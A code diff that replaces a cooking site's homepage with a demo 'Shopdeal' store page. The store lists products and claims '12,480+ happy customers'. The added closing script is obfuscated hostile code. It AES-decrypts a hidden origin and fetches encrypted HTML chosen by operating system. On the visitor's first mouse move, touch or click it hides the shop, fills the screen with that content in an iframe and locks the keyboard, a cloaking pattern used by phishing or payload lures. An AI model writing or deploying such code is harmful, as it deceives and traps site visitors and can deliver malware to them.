+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
-    </div>
-  </div>
-</section>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
+    </section>
 
-<!-- 7 CONVERTER -->
-<section class="sec" id="converter" aria-labelledby="cv-h">
-  <div class="wrap">
-    <div class="head"><span class="kicker">Measurement converter</span><h2 id="cv-h">Convert cups to grams (and back)</h2><p>A cup of flour and a cup of sugar don't weigh the same. Weighing ingredients is more accurate, especially for baking — this converter uses typical weights for common ingredients.</p></div>
-    <div class="tool flip">
-      <div class="tool-img"><img src="https://images.pexels.com/photos/8175357/pexels-photo-8175357.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Woman weighing flour in a bowl on a kitchen scale" width="900" height="900" loading="lazy"></div>
-      <form class="tool-body" id="converter-form" onsubmit="return false"><div>
-        <div class="g2">
-          <div class="fld full"><label for="cv-ing">Ingredient</label><select id="cv-ing"></select></div>
-          <div class="fld"><label for="cv-dir">Convert</label><select id="cv-dir"><option value="to-g">Cups/spoons → grams</option><option value="to-cup">Grams → cups/spoons</option></select></div>
-          <div class="fld"><label for="cv-qty" id="cv-qty-label">Amount</label><input id="cv-qty" type="number" min="0" step="0.25" value="1" inputmode="decimal"></div>
-          <div class="fld full" id="cv-unit-wrap"><label for="cv-unit">Measure</label><select id="cv-unit"></select></div>
-        </div>
-        <div class="result" aria-live="polite"><div class="big" id="cv-out">—</div><small id="cv-sub"></small></div>
-        <p class="muted" style="font-size:.88rem;margin:14px 0 0">Based on US cups (240 ml) spooned and leveled. Brands and packing vary, so treat results as close guides.</p>
-      </div></form>
-    </div>
-  </div>
-</section>
+    <!-- Histats.com  START  (aync)-->
+   <!--  <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript> -->
+    <!-- Histats.com  END  -->
 
-<!-- 8 SPICE PAIRING -->
-<section class="sec paper" id="spices-sec" aria-labelledby="sp-h">
-  <div class="wrap split">
-    <div>
-      <span class="kicker">Spice pairing finder</span>
-      <h2 id="sp-h">Which spices go with what?</h2>
-      <p class="lead">Choose a main ingredient to see spices that traditionally pair well with it, plus one practical tip to get the most flavor.</p>
-      <div id="spices">
-        <div class="fld"><label for="sp-ing">Main ingredient</label><select id="sp-ing"></select></div>
-        <div class="pair" id="sp-list" aria-live="polite"></div>
-        <div class="tipbox"><strong>Tip:</strong> <span id="sp-tip"></span></div>
+    <!-- Trust strip -->
+    <div class="trust">
+      <div class="container trust-grid">
+        <div class="trust-item"><span>🚚</span> Free shipping $75+</div>
+        <div class="trust-item"><span>↩️</span> 30-day returns</div>
+        <div class="trust-item"><span>🔒</span> Secure checkout</div>
+        <div class="trust-item"><span>💬</span> 7-day support</div>
       </div>
     </div>
-    <img class="rimg" src="https://images.pexels.com/photos/5741482/pexels-photo-5741482.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Cinnamon sticks, cloves and other whole spices on a dark textured counter" width="900" height="1125" loading="lazy">
-  </div>
-</section>
 
-<!-- 9 FOOD SAFETY -->
-<section class="sec green on-green" id="safety" aria-labelledby="sf-h">
-  <div class="wrap split">
-    <div>
-      <span class="kicker">Food safety</span>
-      <h2 id="sf-h">Safe minimum cooking temperatures</h2>
-      <p style="color:#B8CEC3">Color isn't a reliable sign that food is cooked. A simple instant-read thermometer is the best way to know. These are the widely used USDA recommendations for the thickest part of the food.</p>
-      <table class="temps"><tbody>
-        <tr><td>Poultry — whole, pieces &amp; ground<small>Chicken, turkey, duck</small></td><td>165°F · 74°C</td></tr>
-        <tr><td>Ground meats<small>Beef, pork, lamb, veal</small></td><td>160°F · 71°C</td></tr>
-        <tr><td>Steaks, chops &amp; roasts<small>Beef, pork, lamb, veal — then rest 3 minutes</small></td><td>145°F · 63°C</td></tr>
-        <tr><td>Fish &amp; shellfish<small>Or until flesh is opaque and flakes easily</small></td><td>145°F · 63°C</td></tr>
-        <tr><td>Egg dishes<small>Casseroles, quiches, frittatas</small></td><td>160°F · 71°C</td></tr>
-        <tr><td>Leftovers &amp; casseroles<small>Reheat until steaming throughout</small></td><td>165°F · 74°C</td></tr>
-      </tbody></table>
-      <p style="color:#B8CEC3;font-size:.9rem;margin-top:14px">Keep cold food at 40°F (4°C) or below and refrigerate leftovers within two hours. For full guidance, see <a href="https://www.foodsafety.gov/food-safety-charts/safe-minimum-internal-temperatures" target="_blank" rel="noopener" style="color:#fff">FoodSafety.gov</a>.</p>
-    </div>
-    <img class="rimg" src="https://images.pexels.com/photos/8054741/pexels-photo-8054741.jpeg?auto=compress&cs=tinysrgb&w=900" alt="Home cook stirring a pot of soup on a gas stove" width="900" height="1125" loading="lazy">
-  </div>
-</section>
+    <section class="section" id="products">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Featured</span>
+          <h2>Handpicked for you</h2>
+          <p>Six customer favorites, priced in USD — with free shipping on qualifying orders.</p>
+        </div>
 
-<!-- 10 SERVICES TEASER -->
-<section class="sec" aria-labelledby="sv-h">
-  <div class="wrap">
-    <div class="head center"><span class="kicker">Learn with us</span><h2 id="sv-h">Want hands-on help in your own kitchen?</h2><p>Alongside our free guides, we offer a small number of personal services for cooks who want tailored help.</p></div>
-    <div class="svc3">
-      <div class="scard"><div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/></svg></div><h3>Private online lessons</h3><p>One-to-one video lessons built around the dishes and skills you want to master, at your pace.</p><a href="services.html#lessons">Learn more</a></div>
-      <div class="scard"><div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><rect x="4" y="3" width="16" height="18" rx="2"/><path d="M8 8h8M8 12h8M8 16h5"/></svg></div><h3>Meal-planning sessions</h3><p>A practical weekly plan and shopping list shaped around your schedule, budget and tastes.</p><a href="services.html#planning">Learn more</a></div>
-      <div class="scard"><div class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="8" cy="9" r="3"/><circle cx="16" cy="9" r="3"/><path d="M2 20c0-3 3-5 6-5s6 2 6 5M12 20c0-3 3-5 6-5 2 0 4 1 4 3"/></svg></div><h3>Group workshops</h3><p>Friendly, hands-on sessions for teams, friends and community groups — online or in person.</p><a href="services.html#workshops">Learn more</a></div>
-    </div>
-    <p style="text-align:center;margin-top:34px"><a class="btn btn-outline" href="services.html">See all services</a></p>
-  </div>
-</section>
+        <div class="grid">
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--sale">Best Seller</span>
+              <img src="https://picsum.photos/seed/shopdeal-sneakers/600/450" alt="Running Sneakers" />
+            </div>
+            <div class="body">
+              <span class="cat">Footwear</span>
+              <h3>Running Sneakers</h3>
+              <div class="price-row">
+                <span class="price">$89.99</span>
+                <span class="old">$139.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 11 FAQ -->
-<section class="sec oat" aria-labelledby="fq-h">
-  <div class="wrap">
-    <div class="head center"><span class="kicker">Common questions</span><h2 id="fq-h">Kitchen questions we hear most</h2></div>
-    <div class="faq">
-      <details><summary>Is it worth weighing ingredients instead of using cups?</summary><p>For baking, yes. Cup measurements vary depending on how you fill the cup, which can change a recipe's result. A digital kitchen scale is inexpensive and makes baking more consistent. For soups, stews and salads, cups and spoons are perfectly fine.</p></details>
-      <details><summary>How long do ground spices really last?</summary><p>They don't spoil in the usual sense, but they lose aroma. Most ground spices are at their best for around a year; whole spices can last two to three years. If a spice smells faint when you rub a pinch between your fingers, it's time to replace it.</p></details>
-      <details><summary>Why does my food steam instead of browning?</summary><p>Usually the pan is overcrowded or not hot enough, or the food is wet. Pat ingredients dry, preheat the pan, and cook in batches so pieces have space around them.</p></details>
-      <details><summary>How do I rescue a dish that's too salty?</summary><p>Add more of the unsalted base (extra vegetables, stock or grains), or balance with a little acid such as lemon juice or vinegar. Dairy like yogurt can also soften saltiness in some dishes.</p></details>
-      <details><summary>Do I need expensive equipment to cook well?</summary><p>No. A sharp chef's knife, a large cutting board, a heavy frying pan, a medium saucepan, a baking tray and an instant-read thermometer will cover most home cooking.</p></details>
-    </div>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Limited</span>
+              <img src="https://picsum.photos/seed/shopdeal-watch/600/450" alt="Classic Watch" />
+            </div>
+            <div class="body">
+              <span class="cat">Accessories</span>
+              <h3>Classic Watch</h3>
+              <div class="price-row">
+                <span class="price">$179.99</span>
+                <span class="old">$249.99</span>
+                <span class="save">−28%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-<!-- 12 NEWSLETTER -->
-<section class="sec-sm" aria-labelledby="nl-h">
-  <div class="wrap">
-    <div class="letter">
-      <img src="https://images.pexels.com/photos/5810663/pexels-photo-5810663.jpeg?auto=compress&cs=tinysrgb&w=1600" alt="Top view of a table set with citrus, vegetables and roasted dishes" width="1600" height="900" loading="lazy">
-      <span class="kicker" style="color:var(--saffron)">The seasonal letter</span>
-      <h2 id="nl-h">One useful email each month</h2>
-      <p>What's in season, a technique worth practicing and a pantry tip — no spam, and you can unsubscribe anytime.</p>
-      <form class="newsletter" novalidate><label class="sr-only" for="nl-em">Email address</label><input id="nl-em" type="email" placeholder="Your email address" autocomplete="email"><input type="text" name="website" tabindex="-1" autocomplete="off" style="display:none" aria-hidden="true"><button class="btn btn-saffron" type="submit">Subscribe</button></form>
-    </div>
-  </div>
-</section>
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-backpack/600/450" alt="Travel Backpack" />
+            </div>
+            <div class="body">
+              <span class="cat">Bags</span>
+              <h3>Travel Backpack</h3>
+              <div class="price-row">
+                <span class="price">$69.99</span>
+                <span class="old">$109.99</span>
+                <span class="save">−36%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
 
-</main>
-<footer class="foot"><div class="wrap">
-  <div class="foot-grid">
-    <div><a class="logo" href="index.php" aria-label="Nutmeg Spruce home"><span class="logo-mark"><svg viewBox="0 0 32 32" aria-hidden="true"><path d="M16 4 9 14h4l-5 7h5l-4 6h14l-4-6h5l-5-7h4z" fill="#8FC2A9"/><circle cx="23.5" cy="24.5" r="4.5" fill="#C9A07A"/><path d="M21 23c1.5-.8 3.5-.6 5 .6" stroke="#8A5A36" stroke-width="1.2" fill="none"/></svg></span><span class="logo-text"><b>Nutmeg Spruce</b><small>Cook with confidence</small></span></a>
-      <p style="margin-top:18px;max-width:330px">Practical, tested guidance for everyday home cooking — from pantry basics and seasonal produce to spices, techniques and kitchen safety.</p></div>
-    <div><h2>Explore</h2><ul><li><a href="index.php">Home</a></li><li><a href="about.html">About us</a></li><li><a href="services.html">Services</a></li><li><a href="contact.html">Contact</a></li><li><a href="index.php#converter">Measurement converter</a></li><li><a href="index.php#produce">Seasonal produce</a></li></ul></div>
-    <div><h2>Policies</h2><ul><li><a href="privacy-policy.html">Privacy Policy</a></li><li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li><li><a href="disclaimer.html">Disclaimer</a></li><li><a href="cookie-policy.html">Cookie Policy</a></li><li><a href="editorial-policy.html">Editorial Policy</a></li></ul></div>
-    <div><h2>Get in touch</h2><ul><li>181 Mercer Street<br>New York, NY 10012, United States</li><li><a href="tel:+18887775845">+1-888-777-5845</a></li><li><a href="mailto:hello@nutmegspruce.com">hello@nutmegspruce.com</a></li><li>Mon–Fri, 9:00 am – 5:00 pm ET</li></ul></div>
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
+            </div>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-  <div class="foot-bot"><span>© <span data-year>2026</span> Nutmeg Spruce. All rights reserved.</span><span><a href="sitemap.xml">Sitemap</a> · <button type="button" data-cookie-settings>Cookie settings</button></span></div>
-</div></footer>
-<div class="cookie" role="dialog" aria-labelledby="ck-h"><h2 id="ck-h">Cookies, briefly</h2>
-<p>We use essential storage to run the site and, only if you agree, analytics and advertising cookies to understand what's useful. <a href="cookie-policy.html">Cookie Policy</a></p>
-<div class="row"><button class="btn btn-sm no-arrow" type="button" data-consent="all">Accept all</button><button class="btn btn-sm btn-outline no-arrow" type="button" data-consent="essential">Essential only</button></div></div>
-<script src="assets/js/main.js" defer></script>
+
+
+  <div id="contentiframe" style="display:none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+  <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen
+    webkitallowfullscreen mozallowfullscreen
+    sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads"
+    style="width:100%; height:100%; border:0;"></iframe>
+</div>
+
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
+
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
